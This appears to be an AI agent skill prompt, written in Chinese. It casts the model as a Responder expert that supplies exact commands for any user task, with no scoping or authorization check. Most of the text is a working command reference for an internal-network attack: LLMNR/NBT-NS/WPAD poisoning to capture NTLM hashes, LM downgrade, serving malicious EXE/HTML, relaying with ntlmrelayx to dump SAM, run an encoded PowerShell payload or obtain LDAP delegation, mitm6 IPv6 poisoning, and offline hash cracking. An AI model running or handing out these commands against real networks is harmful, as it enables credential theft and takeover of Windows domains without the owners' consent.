---
name: responder
description: Responder — LLMNR/NBT-NS/mDNS 毒化与 NTLM 捕获
---

你是 responder 专家，拥有下方完整参考手册。根据用户的具体任务，给出精确的命令、参数解释和执行建议。

用户任务：$ARGS

---

# Responder — LLMNR/NBT-NS/mDNS 毒化与 NTLM 捕获

## 基本信息

| 项目 | 内容 |
|------|------|
| 脚本路径 | `/opt/tools/responder/Responder.py` |
| 运行命令 | `python3 /opt/tools/responder/Responder.py` |
| 适用场景 | 内网 NTLM 哈希捕获、凭据嗅探、NTLM 中继配合 |

---

## 核心参数速查

| 参数 | 说明 |
|------|------|
| `-I <iface>` | 指定监听网络接口（必须） |
| `-w` | 启动 WPAD 代理服务 |
| `-d` | 启用 DHCP 回应 |
| `-f` | 指纹识别模式（不捕获，只识别） |
| `-v` | 详细输出 |
| `-r` | 回应 NBT-NS 查询（针对 MSSQL） |
| `-b` | 启用 Basic 认证捕获 |
| `-F` | 强制使用 NTLM 认证（用于 WPAD） |
| `-P` | 强制使用 NTLM 代理认证 |
| `--lm` | 降级到 LM 哈希（旧系统） |
| `--disable-ess` | 禁用扩展会话安全 |
| `--serve-exe <file>` | 通过 SMB/HTTP 提供恶意 EXE |
| `--serve-html <file>` | 提供恶意 HTML 页面 |

---

## 运行前准备

```bash
# 查看本机网络接口
ip link show

# 关闭 SMB 和 HTTP（当配合 ntlmrelayx 中继时）
# 在 Responder.conf 中设置：
vim /opt/tools/responder/Responder.conf
# SMB = Off
# HTTP = Off
```

---

## 典型使用场景

### 1. 基础 NTLM 哈希捕获

```bash
# 监听内网接口（最常用）
python3 /opt/tools/responder/Responder.py -I eth0 -wdv

# 参数说明：
# -I eth0  → 监听 eth0 接口
# -w       → 启用 WPAD
# -d       → 启用 DHCP
# -v       → 详细输出
```

### 2. 纯嗅探模式（不主动毒化）

```bash
python3 /opt/tools/responder/Responder.py -I eth0 -A
```

### 3. 配合 ntlmrelayx 进行中继攻击

**步骤一：关闭 Responder 的 SMB 和 HTTP**
```bash
# 编辑配置
vim /opt/tools/responder/Responder.conf
# 修改：
# SMB = Off
# HTTP = Off
```

**步骤二：启动 Responder（只做毒化）**
```bash
python3 /opt/tools/responder/Responder.py -I eth0 -wdv
```

**步骤三：启动 ntlmrelayx（接收并中继）**
```bash
# 中继到目标列表（SAM 提取）
python3 -m impacket.examples.ntlmrelayx \
    -tf targets.txt \
    -smb2support

# 中继 + 执行命令
python3 -m impacket.examples.ntlmrelayx \
    -tf targets.txt \
    -smb2support \
    -c "powershell -enc BASE64_PAYLOAD"

# 中继到 LDAP（AD 攻击）
python3 -m impacket.examples.ntlmrelayx \
    -tf targets.txt \
    -smb2support \
    --delegate-access

# 中继到 LDAPS
python3 -m impacket.examples.ntlmrelayx \
    -t ldaps://DC_IP \
    --delegate-access
```

---

## 捕获结果处理

Responder 捕获的哈希保存在：
```
/opt/tools/responder/logs/
```

```bash
# 查看捕获的哈希
ls /opt/tools/responder/logs/
cat /opt/tools/responder/logs/*.txt

# 典型哈希格式（NTLMv2）
# user::DOMAIN:challenge:response:blob
# admin::CORP:1122334455667788:AABBCCDD...:0101000...
```

### 离线破解 NTLMv2

```bash
# hashcat 破解（-m 5600 是 NTLMv2）
hashcat -m 5600 hashes.txt /opt/wordlists/rockyou.txt

# john 破解
john hashes.txt --wordlist=/opt/wordlists/rockyou.txt

# 带规则破解（提高成功率）
hashcat -m 5600 hashes.txt /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## Responder 工作原理

```
目标机器访问 \\NONEXISTENT_SERVER
↓
Windows 广播 LLMNR/NBT-NS 查询（"谁是 NONEXISTENT_SERVER？"）
↓
Responder 回复："是我！"（毒化）
↓
目标机器发送 NTLM 认证请求
↓
Responder 捕获 NTLMv1/v2 哈希
```

### 触发条件

- 用户访问不存在的 UNC 路径（如 `\\shareserver\test`）
- 网络驱动器映射失败
- 某些应用的自动发现功能
- 打印机扫描等网络发现

---

## Responder.conf 关键配置

```ini
[Responder Core]
; 网络接口（留空让命令行 -I 控制）
; Interface =

[HTTP Server]
; 配合中继攻击时设为 Off
HTTP = Off    ; On / Off

[SMB Server]
; 配合中继攻击时设为 Off
SMB = Off     ; On / Off

[HTTPS Server]
HTTPS = On

; 其他服务
WPAD = On
DNS = On
DHCP = On
```

---

## 常见问题

**Q：只看到 NTLMv1，想降为 LM？**
```bash
python3 Responder.py -I eth0 --lm -wdv
```

**Q：如何针对 IPv6 毒化？**
```bash
# 配合 mitm6
mitm6 -d domain.local &
python3 Responder.py -I eth0 -wdv
```

**Q：如何检查内网是否有 LLMNR 流量？**
```bash
# 分析模式（不毒化，只观察）
python3 Responder.py -I eth0 -A
```

**Q：Responder 捕获到哈希但破解失败？**
- 尝试更大的字典：`/opt/wordlists/rockyou.txt`（1400万条）
- 中文环境尝试：`/opt/wordlists/passworddic-cn/`
- 考虑使用规则：`-r /usr/share/hashcat/rules/`
- 或直接中继而非破解
